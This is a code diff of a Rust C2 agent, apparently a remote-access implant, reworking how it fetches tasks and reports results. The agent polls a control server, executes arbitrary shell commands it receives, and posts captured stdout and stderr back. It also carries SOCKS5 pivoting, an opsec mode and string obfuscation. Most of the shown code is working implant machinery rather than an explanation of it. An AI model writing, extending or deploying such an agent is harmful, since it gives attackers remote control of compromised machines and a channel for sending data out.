@@ -1,10 +1,14 @@
-use crate::commands::obfuscated::xor_obfuscate;
 use crate::config::{validate_c2_base_url, AgentConfig};
 use crate::networking::egress::get_egress_ip;
 use crate::networking::socks5_pivot::Socks5PivotHandler;
 use crate::networking::socks5_pivot_server::Socks5PivotServer;
 use crate::opsec::{determine_agent_mode, AgentMode};
+use crate::tasks::{
+    validate_identifier, Task, TaskOutcome, TaskOutput, TaskResult, TaskStatusUpdate, TaskType,
+    MAX_TASK_ERROR_CHARS, MAX_TASK_OUTPUT_CHARS, TASK_SCHEMA_VERSION,
+};
 use crate::util::random_jitter;
+use chrono::{DateTime, SecondsFormat, Utc};
 use get_if_addrs::get_if_addrs;
 use hostname;
 use log::{debug, error, info, warn};
@@ -12,65 +16,84 @@ use obfstr::obfstr;
 use once_cell::sync::Lazy;
 use os_info;
 use reqwest::{Method, StatusCode, Url};
-use serde::Deserialize;
 use serde_json::{json, Value};
-use std::collections::HashMap;
+use std::collections::{HashMap, VecDeque};
 use std::env;
-use std::io;
+use std::io::{self, Read};
 use std::path::Path;
-use std::process::Command;
+use std::process::{Command, ExitStatus, Stdio};
+use std::sync::mpsc as std_mpsc;
 use std::sync::Arc;
 use std::sync::Mutex;
-use std::time::Duration;
+use std::time::{Duration, Instant};
 use tokio::sync::mpsc;
 use tokio::sync::Mutex as TokioMutex;
 use tokio::task::JoinHandle;
-use tokio::time::timeout;
 
 static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> =
     Lazy::new(|| TokioMutex::new(HashMap::new()));
-static QUEUED_COMMANDS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::new()));
+static TASK_OUTBOX: Lazy<TaskOutbox> = Lazy::new(TaskOutbox::default);
 
-// Define the expected structure for the command response JSON
-#[derive(Deserialize)]
-struct CommandResponse {
-    command: String,
-}
+const MAX_CAPTURE_BYTES: usize = MAX_TASK_OUTPUT_CHARS;
+const MAX_RESULT_ERROR_CHARS: usize = MAX_TASK_ERROR_CHARS;
+const OUTPUT_READ_CHUNK_BYTES: usize = 16 * 1024;
+const OUTPUT_CHANNEL_CAPACITY: usize = 16;
+const MAX_OUTPUT_EVENTS_PER_TICK: usize = OUTPUT_CHANNEL_CAPACITY * 2;
+const MAX_TERMINAL_TASK_IDS: usize = 1_024;
 
 #[derive(Clone, Copy)]
-enum C2Endpoint {
+enum C2Endpoint<'a> {
     Heartbeat,
-    Command,
-    Result,
-}
-
-impl C2Endpoint {
-    fn as_segment(self) -> &'static str {
-        match self {
-            Self::Heartbeat => "heartbeat",
-            Self::Command => "command",
-            Self::Result => "result",
-        }
-    }
+    Tasks,
+    Results,
+    TaskStatus(&'a str),
 }
 
 fn build_c2_endpoint_url(
     server_addr: &str,
     agent_id: &str,
-    endpoint: C2Endpoint,
+    endpoint: C2Endpoint<'_>,
 ) -> io::Result<Url> {
+    validate_identifier("agent_id", agent_id)
+        .map_err(|err| io::Error::new(io::ErrorKind::InvalidInput, err))?;
+    if let C2Endpoint::TaskStatus(task_id) = endpoint {
+        validate_identifier("task_id", task_id)
+            .map_err(|err| io::Error::new(io::ErrorKind::InvalidInput, err))?;
+    }
+
     let mut url = validate_c2_base_url(server_addr)
         .map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;
 
-    url.path_segments_mut()
-        .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "C2 URL cannot be a base"))?
+    let mut segments = url
+        .path_segments_mut()
+        .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "C2 URL cannot be a base"))?;
+    segments
         .pop_if_empty()
         .push("api")
         .push("agent")
-        .push(agent_id)
-        .push(endpoint.as_segment());
+        .push(agent_id);
+
+    match endpoint {
+        C2Endpoint::Heartbeat => {
+            segments.push("heartbeat");
+        }
+        C2Endpoint::Tasks => {
+            segments.push("tasks");
+        }
+        C2Endpoint::Results => {
+            segments.push("results");
+        }
+        C2Endpoint::TaskStatus(task_id) => {
+            segments.push("tasks").push(task_id).push("status");
+        }
+    }
+    drop(segments);
 
     Ok(url)
+}
+
+fn utc_timestamp() -> String {
+    Utc::now().to_rfc3339_opts(SecondsFormat::Millis, true)
 }
 
 //  Helper function to get current timestamp
@@ -82,17 +105,16 @@ fn now_timestamp() -> u64 {
 }
 
 #[cfg(windows)]
-fn create_command(command: &str, args: &[&str]) -> Command {
+fn create_command(command: &str) -> Command {
     let mut cmd = Command::new("cmd");
     cmd.arg("/C").arg(command);
-    cmd.args(args);
     cmd
 }
 
 #[cfg(not(windows))]
-fn create_command(command: &str, args: &[&str]) -> Command {
-    let mut cmd = Command::new(command);
-    cmd.args(args);
+fn create_command(command: &str) -> Command {
+    let mut cmd = Command::new("sh");
+    cmd.arg("-c").arg(command);
     cmd
 }
 
@@ -118,59 +140,516 @@ fn get_all_local_ips() -> Vec<String> {
     ips
 }
 
-async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
+#[derive(Clone, Debug, Eq, PartialEq)]
+struct ShellExecution {
+    stdout: String,
+    stderr: String,
+    exit_code: Option<i32>,
+    error: Option<String>,
+}
+
+impl ShellExecution {
+    fn failed(error: impl Into<String>) -> Self {
+        Self {
+            stdout: String::new(),
+            stderr: String::new(),
+            exit_code: None,
+            error: Some(error.into()),
+        }
+    }
+}
+
+async fn execute_shell(command: &str, timeout_seconds: u64) -> ShellExecution {
+    let deadline = Instant::now() + Duration::from_secs(timeout_seconds);
+    let cmd_parts: Vec<&str> = command.split_whitespace().collect();
     if cmd_parts.is_empty() {
-        return Ok(String::new());
+        return ShellExecution::failed("shell command is empty");
     }
 
-    // Handle cd command specially
     if cmd_parts[0] == "cd" {
-        if cmd_parts.len() > 1 {
-            let dir = cmd_parts[1];
-            let path = Path::new(dir);
+        let result = if cmd_parts.len() > 1 {
+            let path = Path::new(cmd_parts[1]);
             if path.exists() {
-                env::set_current_dir(path)?;
-                return Ok(format!(
-                    "Changed directory to {}",
-                    env::current_dir()?.display()
-                ));
+                env::set_current_dir(path).and_then(|_| {
+                    env::current_dir()
+                        .map(|current| format!("Changed directory to {}", current.display()))
+                })
             } else {
-                return Err(io::Error::new(
+                Err(io::Error::new(
                     io::ErrorKind::NotFound,
                     "Directory not found",
-                ));
+                ))
             }
-        }
-        return Ok(format!(
-            "Current directory: {}",
-            env::current_dir()?.display()
-        ));
-    }
-
-    // Handle other commands with timeout
-    let result = timeout(Duration::from_secs(30), async {
-        let output = if cfg!(windows) {
-            let full_command = cmd_parts.join(" ");
-            create_command(&full_command, &[]).output()?
         } else {
-            create_command(cmd_parts[0], &cmd_parts[1..]).output()?
+            env::current_dir().map(|current| format!("Current directory: {}", current.display()))
         };
 
-        Ok::<_, io::Error>(format!(
-            "{}{}",
-            String::from_utf8_lossy(&output.stdout),
-            String::from_utf8_lossy(&output.stderr)
-        ))
-    })
-    .await;
+        return match result {
+            Ok(stdout) => ShellExecution {
+                stdout,
+                stderr: String::new(),
+                exit_code: Some(0),
+                error: None,
+            },
+            Err(err) => ShellExecution::failed(err.to_string()),
+        };
+    }
 
-    match result {
-        Ok(Ok(output)) => Ok(output),
-        Ok(Err(e)) => Err(e),
-        Err(_) => Err(io::Error::new(
-            io::ErrorKind::TimedOut,
-            "Command timed out after 30 seconds",
-        )),
+    let mut process = create_command(command);
+    process.stdout(Stdio::piped()).stderr(Stdio::piped());
+    #[cfg(unix)]
+    {
+        use std::os::unix::process::CommandExt;
+        process.process_group(0);
+    }
+
+    let mut child = match process.spawn() {
+        Ok(child) => child,
+        Err(err) => return ShellExecution::failed(format!("failed to start command: {err}")),
+    };
+    let process_tree = ProcessTreeGuard::attach(&child);
+    let (output_sender, output_receiver) =
+        std_mpsc::sync_channel::<OutputEvent>(OUTPUT_CHANNEL_CAPACITY);
+    let mut captured = CapturedOutput::default();
+
+    match child.stdout.take() {
+        Some(stdout) => spawn_output_reader(stdout, OutputStream::Stdout, output_sender.clone()),
+        None => captured.mark_unavailable(OutputStream::Stdout),
+    }
+    match child.stderr.take() {
+        Some(stderr) => spawn_output_reader(stderr, OutputStream::Stderr, output_sender.clone()),
+        None => captured.mark_unavailable(OutputStream::Stderr),
+    }
+    drop(output_sender);
+
+    let mut exit_status = None;
+
+    loop {
+        captured.drain(&output_receiver);
+
+        if exit_status.is_none() {
+            match child.try_wait() {
+                Ok(Some(status)) => exit_status = Some(status),
+                Ok(None) => {}
+                Err(err) => {
+                    let mut errors = vec![format!("failed to wait for command: {err}")];
+                    if let Some(termination_error) = process_tree.terminate(&mut child) {
+                        errors.push(termination_error);
+                    }
+                    captured.drain(&output_receiver);
+                    let execution = captured.finish(None, errors);
+                    reap_child_detached(child);
+                    return execution;
+                }
+            }
+        }
+
+        if exit_status.is_some() && captured.is_complete() {
+            let mut errors = Vec::new();
+            if let Some(cleanup_error) = process_tree.cleanup_descendants() {
+                errors.push(cleanup_error);
+            }
+            return captured.finish(exit_status, errors);
+        }
+
+        let now = Instant::now();
+        if now >= deadline {
+            let mut errors = vec![format!("command timed out after {timeout_seconds} seconds")];
+            if let Some(termination_error) = process_tree.terminate(&mut child) {
+                errors.push(termination_error);
+            }
+            captured.drain(&output_receiver);
+            let execution = captured.finish(None, errors);
+            reap_child_detached(child);
+            return execution;
+        }
+
+        tokio::time::sleep((deadline - now).min(Duration::from_millis(10))).await;
+    }
+}
+
+#[derive(Clone, Copy, Debug)]
+enum OutputStream {
+    Stdout,
+    Stderr,
+}
+
+enum OutputEvent {
+    Data(OutputStream, Vec<u8>),
+    Done(OutputStream),
+    Error(OutputStream, String),
+}
+
+#[derive(Default)]
+struct CapturedOutput {
+    stdout: Vec<u8>,
+    stderr: Vec<u8>,
+    stdout_done: bool,
+    stderr_done: bool,
+    stdout_truncated: bool,
+    stderr_truncated: bool,
+    errors: Vec<String>,
+}
+
+impl CapturedOutput {
+    fn mark_unavailable(&mut self, stream: OutputStream) {
+        self.errors
+            .push(format!("command {} pipe was unavailable", stream.label()));
+        self.mark_done(stream);
+    }
+
+    fn mark_done(&mut self, stream: OutputStream) {
+        match stream {
+            OutputStream::Stdout => self.stdout_done = true,
+            OutputStream::Stderr => self.stderr_done = true,
+        }
+    }
+
+    fn push(&mut self, stream: OutputStream, bytes: &[u8]) {
+        let (destination, truncated) = match stream {
+            OutputStream::Stdout => (&mut self.stdout, &mut self.stdout_truncated),
+            OutputStream::Stderr => (&mut self.stderr, &mut self.stderr_truncated),
+        };
+        let remaining = MAX_CAPTURE_BYTES.saturating_sub(destination.len());
+        let accepted = remaining.min(bytes.len());
+        destination.extend_from_slice(&bytes[..accepted]);
+        if accepted < bytes.len() {
+            *truncated = true;
+        }
+    }
+
+    fn drain(&mut self, receiver: &std_mpsc::Receiver<OutputEvent>) {
+        for _ in 0..MAX_OUTPUT_EVENTS_PER_TICK {
+            match receiver.try_recv() {
+                Ok(OutputEvent::Data(stream, bytes)) => self.push(stream, &bytes),
+                Ok(OutputEvent::Done(stream)) => self.mark_done(stream),
+                Ok(OutputEvent::Error(stream, error)) => {
+                    self.errors.push(format!(
+                        "failed to read command {}: {}",
+                        stream.label(),
+                        error
+                    ));
+                    self.mark_done(stream);
+                }
+                Err(std_mpsc::TryRecvError::Empty) => return,
+                Err(std_mpsc::TryRecvError::Disconnected) => {
+                    if !self.stdout_done {
+                        self.errors
+                            .push("command stdout reader stopped unexpectedly".to_string());
+                        self.stdout_done = true;
+                    }
+                    if !self.stderr_done {
+                        self.errors
+                            .push("command stderr reader stopped unexpectedly".to_string());
+                        self.stderr_done = true;
+                    }
+                    return;
+                }
+            }
+        }
+    }
+
+    fn is_complete(&self) -> bool {
+        self.stdout_done && self.stderr_done
+    }
+
+    fn finish(mut self, status: Option<ExitStatus>, mut errors: Vec<String>) -> ShellExecution {
+        errors.append(&mut self.errors);
+        if self.stdout_truncated {
+            errors.push(format!("stdout truncated at {} bytes", MAX_CAPTURE_BYTES));
+        }
+        if self.stderr_truncated {
+            errors.push(format!("stderr truncated at {} bytes", MAX_CAPTURE_BYTES));
+        }
+
+        let exit_code = status.as_ref().and_then(ExitStatus::code);
+        if status.as_ref().is_some_and(|status| !status.success()) {
+            errors.push(exit_status_error(exit_code));
+        }
+
+        let (stdout, stdout_decode_truncated) = decode_bounded_output(&self.stdout);
+        let (stderr, stderr_decode_truncated) = decode_bounded_output(&self.stderr);
+        if stdout_decode_truncated && !self.stdout_truncated {
+            errors.push(format!("stdout truncated at {} bytes", MAX_CAPTURE_BYTES));
+        }
+        if stderr_decode_truncated && !self.stderr_truncated {
+            errors.push(format!("stderr truncated at {} bytes", MAX_CAPTURE_BYTES));
+        }
+
+        ShellExecution {
+            stdout,
+            stderr,
+            exit_code,
+            error: (!errors.is_empty()).then(|| errors.join("; ")),
+        }
+    }
+}
+
+fn decode_bounded_output(bytes: &[u8]) -> (String, bool) {
+    let mut output = String::from_utf8_lossy(bytes).into_owned();
+    if output.len() <= MAX_CAPTURE_BYTES {
+        return (output, false);
+    }
+
+    let mut boundary = MAX_CAPTURE_BYTES;
+    while !output.is_char_boundary(boundary) {
+        boundary -= 1;
+    }
+    output.truncate(boundary);
+    (output, true)
+}
+
+impl OutputStream {
+    fn label(self) -> &'static str {
+        match self {
+            Self::Stdout => "stdout",
+            Self::Stderr => "stderr",
+        }
+    }
+}
+
+fn spawn_output_reader<R>(
+    mut reader: R,
+    stream: OutputStream,
+    sender: std_mpsc::SyncSender<OutputEvent>,
+) where
+    R: Read + Send + 'static,
+{
+    std::thread::spawn(move || {
+        let mut buffer = vec![0u8; OUTPUT_READ_CHUNK_BYTES];
+        loop {
+            match reader.read(&mut buffer) {
+                Ok(0) => {
+                    let _ = sender.send(OutputEvent::Done(stream));
+                    return;
+                }
+                Ok(read) => {
+                    if sender
+                        .send(OutputEvent::Data(stream, buffer[..read].to_vec()))
+                        .is_err()
+                    {
+                        return;
+                    }
+                }
+                Err(err) => {
+                    let _ = sender.send(OutputEvent::Error(stream, err.to_string()));
+                    return;
+                }
+            }
+        }
+    });
+}
+
+fn reap_child_detached(mut child: std::process::Child) {
+    std::thread::spawn(move || {
+        let deadline = Instant::now() + Duration::from_secs(5);
+        loop {
+            match child.try_wait() {
+                Ok(Some(_)) | Err(_) => return,
+                Ok(None) if Instant::now() >= deadline => {
+                    let _ = child.kill();
+                    let _ = child.wait();
+                    return;
+                }
+                Ok(None) => std::thread::sleep(Duration::from_millis(10)),
+            }
+        }
+    });
+}
+
+struct ProcessTreeGuard {
+    pid: u32,
+    #[cfg(windows)]
+    job: Option<WindowsJob>,
+}
+
+impl ProcessTreeGuard {
+    fn attach(child: &std::process::Child) -> Self {
+        Self {
+            pid: child.id(),
+            #[cfg(windows)]
+            job: WindowsJob::attach(child).ok(),
+        }
+    }
+
+    #[cfg(unix)]
+    fn terminate(&self, child: &mut std::process::Child) -> Option<String> {
+        let result = unsafe { libc::kill(-(self.pid as i32), libc::SIGKILL) };
+        if result == 0 {
+            return None;
+        }
+        let group_error = io::Error::last_os_error();
+        if group_error.raw_os_error() == Some(libc::ESRCH) {
+            return child.kill().err().map(|error| error.to_string());
+        }
+        match child.kill() {
+            Ok(()) => Some(format!(
+                "failed to terminate command process group: {}",
+                group_error
+            )),
+            Err(child_error) => Some(format!(
+                "failed to terminate command process group: {}; direct termination also failed: {}",
+                group_error, child_error
+            )),
+        }
+    }
+
+    #[cfg(unix)]
+    fn cleanup_descendants(&self) -> Option<String> {
+        let result = unsafe { libc::kill(-(self.pid as i32), libc::SIGKILL) };
+        if result == 0 {
+            return None;
+        }
+        let error = io::Error::last_os_error();
+        if error.raw_os_error() == Some(libc::ESRCH) {
+            None
+        } else {
+            Some(format!("failed to clean up command process group: {error}"))
+        }
+    }
+
+    #[cfg(windows)]
+    fn terminate(&self, child: &mut std::process::Child) -> Option<String> {
+        if let Some(job) = &self.job {
+            if job.terminate().is_ok() {
+                return None;
+            }
+        }
+        match terminate_windows_tree_bounded(self.pid) {
+            Ok(()) => None,
+            Err(tree_error) => match child.kill() {
+                Ok(()) => Some(format!(
+                    "failed to terminate full command tree: {tree_error}; terminated direct child"
+                )),
+                Err(child_error) => Some(format!(
+                    "failed to terminate full command tree: {tree_error}; direct termination also failed: {child_error}"
+                )),
+            },
+        }
+    }
+
+    #[cfg(windows)]
+    fn cleanup_descendants(&self) -> Option<String> {
+        self.job
+            .as_ref()
+            .and_then(|job| job.terminate().err())
+            .map(|error| format!("failed to clean up command job: {error}"))
+    }
+
+    #[cfg(not(any(unix, windows)))]
+    fn terminate(&self, child: &mut std::process::Child) -> Option<String> {
+        child.kill().err().map(|error| error.to_string())
+    }
+
+    #[cfg(not(any(unix, windows)))]
+    fn cleanup_descendants(&self) -> Option<String> {
+        None
+    }
+}
+
+#[cfg(windows)]
+struct WindowsJob {
+    handle: winapi::um::winnt::HANDLE,
+}
+
+#[cfg(windows)]
+impl WindowsJob {
+    fn attach(child: &std::process::Child) -> io::Result<Self> {
+        use std::os::windows::io::AsRawHandle;
+        use std::{mem, ptr};
+        use winapi::shared::minwindef::FALSE;
+        use winapi::um::jobapi2::{
+            AssignProcessToJobObject, CreateJobObjectW, SetInformationJobObject,
+        };
+        use winapi::um::winnt::{
+            JobObjectExtendedLimitInformation, HANDLE, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
+            JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
+        };
+
+        let handle: HANDLE = unsafe { CreateJobObjectW(ptr::null_mut(), ptr::null()) };
+        if handle.is_null() {
+            return Err(io::Error::last_os_error());
+        }
+        let mut limits: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = unsafe { mem::zeroed() };
+        limits.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
+        let configured = unsafe {
+            SetInformationJobObject(
+                handle,
+                JobObjectExtendedLimitInformation,
+                &mut limits as *mut JOBOBJECT_EXTENDED_LIMIT_INFORMATION as *mut _,
+                mem::size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
+            )
+        };
+        if configured == FALSE {
+            let error = io::Error::last_os_error();
+            unsafe {
+                winapi::um::handleapi::CloseHandle(handle);
+            }
+            return Err(error);
+        }
+        let assigned = unsafe { AssignProcessToJobObject(handle, child.as_raw_handle() as HANDLE) };
+        if assigned == FALSE {
+            unsafe {
+                winapi::um::handleapi::CloseHandle(handle);
+            }
+            return Err(io::Error::last_os_error());
+        }
+        Ok(Self { handle })
+    }
+
+    fn terminate(&self) -> io::Result<()> {
+        use winapi::shared::minwindef::FALSE;
+        use winapi::um::jobapi2::TerminateJobObject;
+
+        if unsafe { TerminateJobObject(self.handle, 1) } == FALSE {
+            return Err(io::Error::last_os_error());
+        }
+        Ok(())
+    }
+}
+
+#[cfg(windows)]
+impl Drop for WindowsJob {
+    fn drop(&mut self) {
+        unsafe {
+            winapi::um::handleapi::CloseHandle(self.handle);
+        }
+    }
+}
+
+#[cfg(windows)]
+fn terminate_windows_tree_bounded(pid: u32) -> io::Result<()> {
+    let mut killer = Command::new("taskkill")
+        .args(["/PID", &pid.to_string(), "/T", "/F"])
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()?;
+    let deadline = Instant::now() + Duration::from_secs(1);
+    loop {
+        match killer.try_wait()? {
+            Some(status) if status.success() => return Ok(()),
+            Some(status) => {
+                return Err(io::Error::other(format!(
+                    "taskkill exited with status {:?}",
+                    status.code()
+                )))
+            }
+            None if Instant::now() >= deadline => {
+                let _ = killer.kill();
+                return Err(io::Error::new(
+                    io::ErrorKind::TimedOut,
+                    "taskkill exceeded its one-second bound",
+                ));
+            }
+            None => std::thread::sleep(Duration::from_millis(10)),
+        }
+    }
+}
+
+fn exit_status_error(exit_code: Option<i32>) -> String {
+    match exit_code {
+        Some(code) => format!("command exited with status {code}"),
+        None => "command terminated without an exit code".to_string(),
     }
 }
 
@@ -255,13 +734,13 @@ pub async fn send_heartbeat_with_client(
             } else {
                 error!("[HTTP] Heartbeat failed with status: {}", response.status());
                 update_c2_failure_state(false); // FAILURE
-                Err(io::Error::new(io::ErrorKind::Other, "Heartbeat failed"))
+                Err(io::Error::other("Heartbeat failed"))
             }
         }
         Err(e) => {
             error!("[HTTP] Heartbeat POST failed: {}", e);
             update_c2_failure_state(false); // FAILURE
-            Err(io::Error::new(io::ErrorKind::Other, e))
+            Err(io::Error::other(e))
         }
     }
 }
@@ -288,15 +767,15 @@ fn build_heartbeat_payload(
     })
 }
 
-// Fetch command from the server
-async fn get_command_with_client(
+// Fetch one typed task from the server.
+async fn get_task_with_client(
     config: &AgentConfig,
     server_addr: &str,
     agent_id: &str,
-) -> io::Result<Option<String>> {
-    let url = build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Command)?;
+) -> io::Result<Option<Task>> {
+    let url = build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Tasks)?;
     info!(
-        "[HTTP] Sending command GET to {} (SOCKS5 enabled: {})",
+        "[HTTP] Sending task GET to {} (SOCKS5 enabled: {})",
         url, config.socks5_enabled
     );
     let client = match config.build_http_client() {
@@ -310,108 +789,574 @@ async fn get_command_with_client(
     match client.request(Method::GET, url).send().await {
         Ok(response) => {
             info!(
-                "[HTTP] Command GET response: {} (SOCKS5 enabled: {})",
+                "[HTTP] Task GET response: {} (SOCKS5 enabled: {})",
                 response.status(),
                 config.socks5_enabled
             );
             if response.status() == StatusCode::NO_CONTENT {
-                update_c2_failure_state(true); // SUCCESS (no command)
+                update_c2_failure_state(true);
                 return Ok(None);
             }
             if response.status().is_success() {
-                // Attempt to parse JSON. If it fails, it's still a C2 communication failure *semantically*.
-                match response.json::<CommandResponse>().await {
-                    Ok(cmd_resp) => {
-                        update_c2_failure_state(true); // SUCCESS
-                        Ok(Some(cmd_resp.command))
+                match response.json::<Task>().await {
+                    Ok(task) => {
+                        if let Err(err) = task.validate_for_agent(agent_id) {
+                            error!("[HTTP] Rejected invalid task: {}", err);
+                            update_c2_failure_state(false);
+                            return Err(io::Error::new(io::ErrorKind::InvalidData, err));
+                        }
+                        update_c2_failure_state(true);
+                        Ok(Some(task))
                     }
-                    Err(e) => {
-                        error!("[HTTP] Failed to parse command response JSON: {}", e);
-                        update_c2_failure_state(false); // FAILURE (bad JSON)
+                    Err(err) => {
+                        error!("[HTTP] Failed to parse task response JSON: {}", err);
+                        update_c2_failure_state(false);
                         Err(io::Error::new(
                             io::ErrorKind::InvalidData,
-                            "Invalid JSON response",
+                            format!("invalid task JSON: {err}"),
                         ))
                     }
                 }
             } else {
                 error!(
-                    "[HTTP] Command fetch failed with status: {}",
+                    "[HTTP] Task fetch failed with status: {}",
                     response.status()
                 );
-                update_c2_failure_state(false); // FAILURE (bad HTTP status)
-                Err(io::Error::new(io::ErrorKind::Other, "Command fetch failed"))
+                update_c2_failure_state(false);
+                Err(io::Error::other(format!(
+                    "task fetch failed with status {}",
+                    response.status()
+                )))
             }
         }
-        Err(e) => {
-            error!("[HTTP] Command GET failed: {}", e);
-            update_c2_failure_state(false); // FAILURE
-            Err(io::Error::new(io::ErrorKind::Other, e))
+        Err(err) => {
+            error!("[HTTP] Task GET failed: {}", err);
+            update_c2_failure_state(false);
+            Err(io::Error::other(err))
         }
     }
 }
 
-// Submit result to the server
-async fn submit_result_with_client(
+async fn submit_running_status_with_client(
     config: &AgentConfig,
     server_addr: &str,
     agent_id: &str,
-    command: &str,
-    output: &str,
-) -> io::Result<()> {
-    let url = build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Result)?;
+    task: &Task,
+    started_at: &str,
+) -> SubmissionOutcome {
+    let url = match build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::TaskStatus(&task.id)) {
+        Ok(url) => url,
+        Err(err) => return SubmissionOutcome::Permanent(err.to_string()),
+    };
+    let update = TaskStatusUpdate::running(task, started_at.to_string());
+    if let Err(err) = update.validate() {
+        return SubmissionOutcome::Permanent(err.to_string());
+    }
     info!(
-        "[HTTP] Sending result POST to {} (SOCKS5 enabled: {})",
+        "[HTTP] Sending running status POST to {} (SOCKS5 enabled: {})",
         url, config.socks5_enabled
     );
     let client = match config.build_http_client() {
         Ok(client) => client,
         Err(e) => {
             update_c2_failure_state(false);
-            return Err(io::Error::other(e));
+            return SubmissionOutcome::Permanent(e.to_string());
         }
     };
-    let obfuscated_output = xor_obfuscate(output, agent_id);
-    let data = json!({
-        "command": command,
-        "output": obfuscated_output
-    });
 
-    match client.request(Method::POST, url).json(&data).send().await {
+    match client.request(Method::POST, url).json(&update).send().await {
         Ok(response) => {
             info!(
-                "[HTTP] Result POST response: {} (SOCKS5 enabled: {})",
+                "[HTTP] Running status POST response: {} (SOCKS5 enabled: {})",
                 response.status(),
                 config.socks5_enabled
             );
-            if response.status().is_success() {
-                update_c2_failure_state(true); // SUCCESS
-                Ok(())
+            let outcome = classify_submission_status(response.status(), "running status");
+            if matches!(outcome, SubmissionOutcome::Accepted) {
+                update_c2_failure_state(true);
             } else {
                 error!(
-                    "[HTTP] Result submission failed with status: {}",
+                    "[HTTP] Running status submission failed with status: {}",
                     response.status()
                 );
-                update_c2_failure_state(false); // FAILURE
-                Err(io::Error::new(
-                    io::ErrorKind::Other,
-                    "Result submission failed",
-                ))
+                update_c2_failure_state(false);
             }
+            outcome
         }
-        Err(e) => {
-            error!("[HTTP] Result POST failed: {}", e);
-            update_c2_failure_state(false); // FAILURE
-            Err(io::Error::new(io::ErrorKind::Other, e))
+        Err(err) => {
+            error!("[HTTP] Running status POST failed: {}", err);
+            update_c2_failure_state(false);
+            SubmissionOutcome::Retryable(err.to_string())
         }
     }
 }
 
-fn is_weak_command(cmd: &str) -> bool {
-    let quiet = [obfstr!("ping").to_string(), obfstr!("echo").to_string()];
-    quiet
-        .iter()
-        .any(|q| starts_with_command_token(cmd, q.as_str()))
+async fn submit_task_result_with_client(
+    config: &AgentConfig,
+    server_addr: &str,
+    agent_id: &str,
+    result: &TaskResult,
+) -> SubmissionOutcome {
+    let url = match build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Results) {
+        Ok(url) => url,
+        Err(err) => return SubmissionOutcome::Permanent(err.to_string()),
+    };
+    if let Err(err) = result.validate() {
+        return SubmissionOutcome::Permanent(err.to_string());
+    }
+    if result.agent_id != agent_id {
+        return SubmissionOutcome::Permanent(
+            "task result agent_id does not match runtime agent".to_string(),
+        );
+    }
+
+    info!(
+        "[HTTP] Sending typed result POST to {} (SOCKS5 enabled: {})",
+        url, config.socks5_enabled
+    );
+    let client = match config.build_http_client() {
+        Ok(client) => client,
+        Err(err) => {
+            update_c2_failure_state(false);
+            return SubmissionOutcome::Permanent(err.to_string());
+        }
+    };
+
+    // Typed v1 output fields are plain UTF-8 by contract. XOR decoding remains
+    // limited to the deprecated legacy /result route on the server.
+    match client.request(Method::POST, url).json(result).send().await {
+        Ok(response) => {
+            info!(
+                "[HTTP] Typed result POST response: {} (SOCKS5 enabled: {})",
+                response.status(),
+                config.socks5_enabled
+            );
+            let outcome = classify_submission_status(response.status(), "typed result");
+            if matches!(outcome, SubmissionOutcome::Accepted) {
+                update_c2_failure_state(true);
+            } else {
+                error!(
+                    "[HTTP] Typed result submission failed with status: {}",
+                    response.status()
+                );
+                update_c2_failure_state(false);
+            }
+            outcome
+        }
+        Err(err) => {
+            error!("[HTTP] Typed result POST failed: {}", err);
+            update_c2_failure_state(false);
+            SubmissionOutcome::Retryable(err.to_string())
+        }
+    }
+}
+
+#[derive(Clone, Debug, Eq, PartialEq)]
+enum SubmissionOutcome {
+    Accepted,
+    Retryable(String),
+    Permanent(String),
+}
+
+fn classify_submission_status(status: StatusCode, operation: &str) -> SubmissionOutcome {
+    if status.is_success() {
+        return SubmissionOutcome::Accepted;
+    }
+    let message = format!("{operation} submission failed with status {status}");
+    if status == StatusCode::REQUEST_TIMEOUT
+        || status == StatusCode::TOO_MANY_REQUESTS
+        || status.is_server_error()
+    {
+        SubmissionOutcome::Retryable(message)
+    } else {
+        SubmissionOutcome::Permanent(message)
+    }
+}
+
+fn build_task_result(
+    task: &Task,
+    started_at: String,
+    completed_at: String,
+    execution: ShellExecution,
+) -> TaskResult {
+    let outcome = if execution.exit_code == Some(0) && execution.error.is_none() {
+        TaskOutcome::Completed
+    } else {
+        TaskOutcome::Failed
+    };
+
+    TaskResult {
+        schema_version: TASK_SCHEMA_VERSION,
+        task_id: task.id.clone(),
+        agent_id: task.agent_id.clone(),
+        outcome,
+        started_at,
+        completed_at,
+        exit_code: execution.exit_code,
+        output: TaskOutput {
+            stdout: execution.stdout,
+            stderr: execution.stderr,
+        },
+        error: bound_result_error(execution.error),
+    }
+}
+
+fn bound_result_error(error: Option<String>) -> Option<String> {
+    const MARKER: &str = "… [truncated]";
+
+    error.map(|error| {
+        if error.chars().count() <= MAX_RESULT_ERROR_CHARS {
+            return error;
+        }
+        let keep = MAX_RESULT_ERROR_CHARS.saturating_sub(MARKER.chars().count());
+        let mut bounded: String = error.chars().take(keep).collect();
+        bounded.push_str(MARKER);
+        bounded
+    })
+}
+
+trait TaskTransport {
+    async fn submit_running(&self, task: &Task, started_at: &str) -> SubmissionOutcome;
+    async fn submit_result(&self, result: &TaskResult) -> SubmissionOutcome;
+}
+
+struct HttpTaskTransport<'a> {
+    config: &'a AgentConfig,
+    server_addr: &'a str,
+    agent_id: &'a str,
+}
+
+impl TaskTransport for HttpTaskTransport<'_> {
+    async fn submit_running(&self, task: &Task, started_at: &str) -> SubmissionOutcome {
+        submit_running_status_with_client(
+            self.config,
+            self.server_addr,
+            self.agent_id,
+            task,
+            started_at,
+        )
+        .await
+    }
+
+    async fn submit_result(&self, result: &TaskResult) -> SubmissionOutcome {
+        submit_task_result_with_client(self.config, self.server_addr, self.agent_id, result).await
+    }
+}
+
